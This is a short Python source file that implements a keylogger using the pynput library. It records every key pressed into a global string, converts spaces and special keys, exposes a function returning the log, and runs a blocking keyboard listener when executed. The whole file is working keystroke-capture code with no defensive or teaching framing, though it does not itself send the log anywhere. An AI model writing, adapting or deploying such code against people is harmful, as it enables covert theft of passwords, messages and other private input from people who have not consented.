from datetime import datetime

import pynput.keyboard

keys_log = ""


def key_pressed(key):
    """
    handle a key press
    :rtype: object
    """
    global keys_log

    try:
        keys_log += str(key.char)
    except AttributeError:
        if key == key.space:
            keys_log += " "
        elif key == key.right or key == key.left or key == key.up or key == key.down:
            keys_log += ""
        else:
            keys_log += str(key)
    except Exception as e:
        print(e)


def get_log():
    return keys_log


def keylogger_start():
    keyboard_listener = pynput.keyboard.Listener(on_press=key_pressed)
    with keyboard_listener:
        keyboard_listener.join()


if __name__ == '__main__':
    keylogger_start()
